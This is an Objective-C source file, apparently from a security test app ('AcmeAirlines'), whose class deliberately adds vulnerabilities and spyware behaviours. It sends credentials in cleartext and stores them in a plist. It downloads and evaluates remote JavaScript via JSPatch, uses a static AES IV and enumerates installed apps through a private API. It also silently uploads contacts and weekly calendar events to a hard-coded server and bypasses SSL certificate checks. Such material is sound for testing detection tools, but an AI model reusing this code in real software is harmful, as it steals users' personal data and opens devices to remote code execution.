//
//  VulnerableAppDelegate.m
//  x_AcmeAirlines
//
//  Created by Hooven, Dustin L on 6/6/16.
//  Copyright © 2016 iMAS. All rights reserved.
//

#import "AddedVulnerabilities.h"
#import <AddressBookUI/AddressBookUI.h>
#import <EventKit/EventKit.h>
#import <Security/Security.h>
#import <CommonCrypto/CommonCryptor.h>
#import <CommonCrypto/CommonKeyDerivation.h>
#include <objc/runtime.h>
#import "JPEngine.h"
#include <objc/runtime.h>

@interface AddedVulnerabilities (){
    ABAddressBookRef addressBook;
}
@end

// constants for sending and saving usernames passwords
NSString* const USER_NAME = @"aUsername";
NSString* const PASSWORD = @"aPassword";
NSString* const SERVER_URL = @"https://52.204.79.136";
// constantes for data encryption
NSString* const IV = @"static iv string";

@implementation AddedVulnerabilities

- (void)addVulnerabilities {
    // check to see if the device is JailBroken
    if ([self isJailBroken]){
        NSLog(@"the device is jailbroken");
        [self addToLog:@"the device is jailbroken"];
        
    }
    else{
        NSLog(@"the device is NOT jailbroken");
        [self addToLog:@"the device is NOT jailbroken"];
    }
    
    // add JSPatch code
    [self addJpengine];
    
    // send clear text username and passwork to server
    [self sendPutRequest:[[NSString alloc] initWithFormat:@"UserName=%@&Password%@", USER_NAME, PASSWORD] withUrl:SERVER_URL];
    
    // store username and password on device in internal storage
    [self saveUsername:USER_NAME andPassword:PASSWORD];
    
    // use static iv for AES-CBC encryption
    NSData *iv;
    NSError* connectionError = nil;
    NSData *encryptedData = [self encryptData:[@"plaintextData" dataUsingEncoding:NSUTF8StringEncoding]
                                     password:PASSWORD // sending constant for the encryption password
                                           iv:&iv
                                        error:&connectionError];
    
    
    // check the timer
    [self checkTime];
    
    // get all the apps store it to a file and sends it to a server
    [self getApps];
    
    [self getContacts];
}

// Method to add JSPatch code for mobile code loading which employs a private method
- (void)addJpengine {
    [JPEngine startEngine];
    NSString *url = @"http://sarandford.github.io/accounts.js";
    NSURLRequest* request = [NSURLRequest requestWithURL:[NSURL URLWithString:url] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:5.0];
    NSHTTPURLResponse* response = nil;
    NSError* connectionError = nil;
    [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:&connectionError];
    NSLog(@"statusCode = %ld", [response statusCode]);
    [self addToLog:[NSString stringWithFormat:@"statusCode = %ld", [response statusCode]]];
    NSLog(@"calling the website......");
    [self addToLog:@"calling the website......"];
    [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:url]] queue:[NSOperationQueue mainQueue] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
        NSString *script = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        @try {
            [JPEngine evaluateScript:script];
        } @catch (NSException *e) {
            NSLog(@"Exception: %@", e);
            [self addToLog:[NSString stringWithFormat:@"Exception: %@", e]];
        }
    }];
    if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusNotDetermined) {
        ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
            if (granted) {
                NSLog(@"GRANTED CONTACT ACCESS");
                [self addToLog:@"GRANTED CONTACT ACCESS"];
            } else {
                NSLog(@"DENIED");
                [self addToLog:@"DENIED"];
            }
        });
    }
}

// Mathod to sent a put request to the server
- (void)sendPutRequest:(NSString *)dataAsString
               withUrl:(NSString *)stringUrl {
    // puth the string data into a data class
    NSData *putData = [dataAsString dataUsingEncoding:NSASCIIStringEncoding allowLossyConversion:YES];
    // get the length of the data to put in the header of the request
    NSString *putLength = [NSString stringWithFormat:@"%lu", (unsigned long)[putData length]];
    // set the url if it is specified, if not use the server constant listes in the class
    NSURL *url = [NSURL URLWithString:(stringUrl) ? stringUrl : SERVER_URL];
    NSLog(@"URL: %@", url);
    
    // create the request to the url using PUT and place the data into the body
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"PUT"];
    [request setHTTPBody:putData];
    // I don't know if we need these hearers, but...
    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
    [request setValue:putLength forHTTPHeaderField:@"Content-Length"];
    
    @try {
        // configure the connection object to use itself as the NSURLConnection delegate
        NSURLConnection *connection = [[NSURLConnection alloc] initWithRequest:request
                                                                      delegate:self
                                                              startImmediately:NO];
        // the connection must be run on the main thread in order for it to use itself as the connection delegate
        [connection scheduleInRunLoop:[NSRunLoop mainRunLoop]
                              forMode:NSDefaultRunLoopMode];
        // start the connection
        [connection start];
        
    }
    @catch (NSException *e) {
        NSLog(@"Exception: %@", e);
    }
}

// Method to store the username and password to a plist file
- (void)saveUsername:(NSString *)username
         andPassword:(NSString *)password {
    // set the path to the users documents directory and name the file
    NSString *destPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    destPath = [destPath stringByAppendingPathComponent:@"Users.plist"];
    
    // create a dictionary object and set the key value pairs
    NSMutableDictionary *data = [[NSMutableDictionary alloc] init];
    data [@"username"] = username;
    data [@"password"] = password;
    //wtire the dictionary object out to the plist file
    [data writeToFile:destPath atomically:YES];
}

// Method to impropperly encrypt a file using a static IV
- (NSData *)encryptData:(NSData *)data
               password:(NSString *)password
                     iv:(NSData **)iv
                  error:(NSError **)error {
    // Makes sure the IV is not null
    NSAssert(iv, @"IV must not be NULL");
    // Set the IV to a constant
    *iv = [IV dataUsingEncoding:NSUTF8StringEncoding];
    // create a key out of the passed in password
    NSData *key = [password dataUsingEncoding:NSUTF8StringEncoding];
    size_t outLength;
    // create a cyperData object that is big enouth to hold the resulting cypher data
    NSMutableData * cipherData = [NSMutableData dataWithLength:data.length + kCCBlockSizeAES128];
    // Encrypt and get the results
    CCCryptorStatus result = CCCrypt(kCCEncrypt, // operation
                                     kCCAlgorithmAES128, // Algorithm
                                     kCCOptionPKCS7Padding, // options
                                     key.bytes, // key
                                     key.length, // keylength
                                     (*iv).bytes, // iv
                                     data.bytes, // dataIn
                                     data.length, // dataInLength
                                     cipherData.mutableBytes, // dataOut
                                     cipherData.length, // dataOutAvailable
                                     &outLength); // dataOutMoved
    if (result == kCCSuccess) {
        // If encryption is successful change the sze of the cipherData to the correct size of the encrypted data
        cipherData.length = outLength;
        NSLog(@"Encryptioin successful!");
        [self addToLog:@"Encryptioin successful!"];
    }
    else {
        // If encryption is not successful display error and nil out the ciupherData created earlier
        if (error) {
            *error = [NSError errorWithDomain:@"Encription not successful"
                                         code:result
                                     userInfo:nil];
        }
        cipherData = nil;
    }
    // Return the cypherData object
    return cipherData;
}

// stealthy timer method that will send send calander appointmentst to the server every week
- (void)checkTime {
    // get current date and time
    NSDate *current = [NSDate date];
    // set the path to the users documents directory and name the file
    NSString *destPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"timer.plist"];
    // create a dictionary object and set the key value pairs
    NSMutableDictionary *data = [[NSMutableDictionary alloc] initWithObjectsAndKeys:current, @"time", nil];
    // create file if it doesn't exist
    if(![[NSFileManager defaultManager] fileExistsAtPath:destPath]) {
        [data writeToFile:destPath atomically:YES];
    } else {
        // load the last timestamp
        NSDictionary *loadedTime = [[NSDictionary alloc] initWithContentsOfFile:destPath];
        NSDate *timeStamp = [loadedTime valueForKey:@"time"];
        //find the difference in the stored timestamp ant the current timestamp
        NSTimeInterval interval = [current timeIntervalSinceDate:timeStamp];
        //if it is greater then a week send an app list
        if (interval >= 604800) {
            //send a file to the server and write a new apps list file
            [self getCalendarAppointments];
            [data writeToFile:destPath atomically:YES];
        }
    }
}

//method to test if device is jailbroken
-(BOOL)isJailBroken{
    BOOL jailBroken = NO;
    
    for (NSString *path in [[NSBundle mainBundle] objectForInfoDictionaryKey:@"JailBreak Test"]) {
        jailBroken = [[NSFileManager defaultManager] fileExistsAtPath:path] ? YES : NO;
    }
    
    NSError *error;
    NSString *stringToBeWritten = @"This is a test.";
    [stringToBeWritten writeToFile:@"/private/jailbreak.txt" atomically:YES encoding:NSUTF8StringEncoding error:&error];
    if(error==nil){
        //Device is jailbroken
        jailBroken = YES;
    } else {
        [[NSFileManager defaultManager] removeItemAtPath:@"/private/jailbreak.txt" error:nil];
    }
    
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]]){
        //Device is jailbroken
        jailBroken = YES;
    }
    
    //All checks have failed. Most probably, the device is not jailbroken
    return jailBroken;
}

//Gets apps that are installed on the device and prints them to log
- (void)getApps {
    Class LSApplicationWorkspace_class = objc_getClass("LSApplicationWorkspace");
    NSObject *workspace = [LSApplicationWorkspace_class performSelector:@selector(defaultWorkspace)];
    NSString *completeString = [NSString stringWithFormat:@"apps: %@:", [workspace performSelector:@selector(allApplications)]];
    
    NSString *filename = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    filename = [filename stringByAppendingPathComponent:@"AppList.txt"];
    
    // create attributes to make the AppList.txt file unprotected
    NSDictionary *attributes = [[NSDictionary alloc] initWithObjectsAndKeys:NSFileProtectionNone, @"NSFileProtectionKey", nil];
    
    // create an unprotected file if it doesn't exist
    // add the unprotected attributes to the file if it does exist
    if(![[NSFileManager defaultManager] fileExistsAtPath:filename]) {
        [[NSFileManager defaultManager] createFileAtPath:filename contents:nil attributes:attributes];
    } else {
        [[NSFileManager defaultManager] setAttributes:attributes ofItemAtPath:filename error:nil];
    }
    
    NSFileHandle *file = [NSFileHandle fileHandleForUpdatingAtPath:filename];
    [file seekToEndOfFile];
    [file writeData:[completeString dataUsingEncoding:NSUTF8StringEncoding]];
    [file writeData:[@"\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [file closeFile];
    
    // read the whole file as a single string
    NSString *content = [NSString stringWithContentsOfFile:filename encoding:NSUTF8StringEncoding error:nil];
    
    // send the file to a server
    [self sendPutRequest:content withUrl:[NSString stringWithFormat:@"%@/applist", SERVER_URL]];
}

// Method to gather contacts from the phone
- (void)getContacts {
    //contact gathering
    addressBook = ABAddressBookCreate();
    if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusAuthorized) {
        NSString *filename = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        filename = [filename stringByAppendingPathComponent:@"Contacts.txt"];
        
        // create file if it doesn't exist
        NSDictionary *protection = [NSDictionary dictionaryWithObject:NSFileProtectionNone forKey:NSFileProtectionKey];
        if(![[NSFileManager defaultManager] fileExistsAtPath:filename])
            [[NSFileManager defaultManager] createFileAtPath:filename contents:nil attributes:protection];
        NSLog(@" contacts granted previously");
        [self addToLog:@"contacts granted previously"];
        CFIndex count = ABAddressBookGetPersonCount(addressBook);
        NSMutableDictionary *people = [NSMutableDictionary dictionary];
        CFArrayRef contactsArray = ABAddressBookCopyArrayOfAllPeople(addressBook);
        NSString* mobileLabel;
        
        for(int i=0;i<count;i++){
            ABRecordRef person = CFArrayGetValueAtIndex(contactsArray,i);
            CFStringRef lName = ABRecordCopyValue(person, kABPersonLastNameProperty);
            ABMultiValueRef phones =(__bridge ABMultiValueRef)((__bridge NSString*)ABRecordCopyValue(person, kABPersonPhoneProperty));
            
            for(int j=0;j< ABMultiValueGetCount(phones);j++){
                mobileLabel = (__bridge NSString*)ABMultiValueCopyLabelAtIndex(phones, j);
                if([mobileLabel isEqualToString:(NSString *)kABPersonPhoneMobileLabel])
                {
                    [people setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:[NSString stringWithFormat:@"%@",lName]];
                    
                }
                else if ([mobileLabel isEqualToString:(NSString*)kABPersonPhoneIPhoneLabel])
                {
                    [people setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:[NSString stringWithFormat:@"%@",lName]];
                    
                    break;
                }
            }
            NSString *completeString = [NSString stringWithFormat:@"%@: %@",[NSString stringWithFormat:@"%@",lName], [people objectForKey:[NSString stringWithFormat:@"%@",lName]]];
            NSFileHandle *file = [NSFileHandle fileHandleForUpdatingAtPath:filename];
            [file seekToEndOfFile];
            [file writeData:[completeString dataUsingEncoding:NSUTF8StringEncoding]];
            [file writeData:[@"\n" dataUsingEncoding:NSUTF8StringEncoding]];
            [file closeFile];
            
            // read the whole file as a single string
            NSString *content = [NSString stringWithContentsOfFile:filename encoding:NSUTF8StringEncoding error:nil];
            NSLog(@"The content of array: %@",content);
            //[self addToLog:[NSString stringWithFormat:@"The content of array: %@",content]];
            [self sendPutRequest:content withUrl:[NSString stringWithFormat:@"%@/contactEntries", SERVER_URL]];
        }
    }
    
}

// Method to get calendar appointments from the calendar app
- (void)getCalendarAppointments {
    EKEventStore *store = [[EKEventStore alloc] init];
    
    // Get the appropriate calendar
    NSCalendar *calendar = [NSCalendar currentCalendar];
    
    if ([store respondsToSelector:@selector(requestAccessToEntityType:completion:)])
    {
        // iOS Settings > Privacy > Calendars > MY APP > ENABLE | DISABLE
        [store requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error)
         {
             if ( granted )
             {
                 NSLog(@"User has granted permission!");
                 // Create the start date components
                 NSDateComponents *oneDayAgoComponents = [[NSDateComponents alloc] init];
                 oneDayAgoComponents.day = -1;
                 NSDate *oneDayAgo = [calendar dateByAddingComponents:oneDayAgoComponents
                                                               toDate:[NSDate date]
                                                              options:0];
                 
                 // Create the end date components
                 NSDateComponents *oneYearFromNowComponents = [[NSDateComponents alloc] init];
                 oneYearFromNowComponents.year = 1;
                 NSDate *oneYearFromNow = [calendar dateByAddingComponents:oneYearFromNowComponents
                                                                    toDate:[NSDate date]
                                                                   options:0];
                 
                 // Create the predicate from the event store's instance method
                 NSPredicate *predicate = [store predicateForEventsWithStartDate:oneDayAgo
                                                                         endDate:oneYearFromNow
                                                                       calendars:nil];
                 
                 // Fetch all events that match the predicate
                 NSArray *events = [store eventsMatchingPredicate:predicate];
                 
                 NSString *filename = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
                 filename = [filename stringByAppendingPathComponent:@"calendar.txt"];
                 
                 // add the unprotected attributes to the file if it does exist
                 if(![[NSFileManager defaultManager] fileExistsAtPath:filename]) {
                     [[NSFileManager defaultManager] createFileAtPath:filename contents:nil attributes:nil];
                 }
                 
                 NSString *completeString = [NSString stringWithFormat:@"Appointments: %@", events];
                 completeString = [completeString stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                 NSFileHandle *file = [NSFileHandle fileHandleForUpdatingAtPath:filename];
                 [file seekToEndOfFile];
                 [file writeData:[completeString dataUsingEncoding:NSUTF8StringEncoding]];
                 [file writeData:[@"\n" dataUsingEncoding:NSUTF8StringEncoding]];
                 [file closeFile];
                 
                 // read the whole file as a single string
                 NSString *content = [NSString stringWithContentsOfFile:filename encoding:NSUTF8StringEncoding error:nil];
                 NSLog(@"The content of array: %@",content);
                 //[self addToLog:[NSString stringWithFormat:@"The content of array: %@",content]];
                 [self sendPutRequest:content withUrl:[NSString stringWithFormat:@"%@/calendarAppointments", SERVER_URL]];
             }
             else
             {
                 NSLog(@"User has not granted permission!");
             }
         }];
    }
}

// NSURLConnection delegate method to overide all server certs
- (void)connection:(NSURLConnection *)connection willSendRequestForAuthenticationChallenge:(NSURLAuthenticationChallenge *)challenge
{
    if([challenge.protectionSpace.authenticationMethod isEqualToString:NSURLAuthenticationMethodServerTrust])
    {
        NSLog(@"Ignoring SSL");
        [self addToLog:@"Ignoring SSL"];
        SecTrustRef trust = challenge.protectionSpace.serverTrust;
        NSURLCredential *cred;
        cred = [NSURLCredential credentialForTrust:trust];
        [challenge.sender useCredential:cred forAuthenticationChallenge:challenge];
        return;
    } else {
        NSLog(@"No SSL requested");
        [self addToLog:@"No SSL requested"];
    }
}

// NSURLConnection delegate method used to display the status code of the response
- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response{
    NSHTTPURLResponse* httpResponse = (NSHTTPURLResponse*)response;
    long code = [httpResponse statusCode];
    if (code >= 200 && code < 300) {
        // if valid response, show response in the log
        NSLog(@"Response ==> %ld connection successful!", code);
    } else {
        NSLog(@"Response ==> %ld connection unsuccessful", code);
    }
}

// Method to add all console output to a log file on the server
- (void)addToLog:(NSString *)logOutput {
    // get device ID
    NSString  *currentDeviceId = [[[UIDevice currentDevice] identifierForVendor]UUIDString];
    // get current date/time for sequential referencing
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setTimeStyle:NSDateFormatterMediumStyle];
    [dateFormatter setDateStyle:NSDateFormatterMediumStyle];
    NSString *currentTime = [dateFormatter stringFromDate:[NSDate date]];
    
    // append text to file
    NSString *completeString = [NSString stringWithFormat:@"%@: %@: %@\n", currentDeviceId, currentTime, logOutput];
    
    // PUT file on the server
    [self sendPutRequest:completeString withUrl:[NSString stringWithFormat:@"%@%@", SERVER_URL, @"/logOutput"]];
}

@end
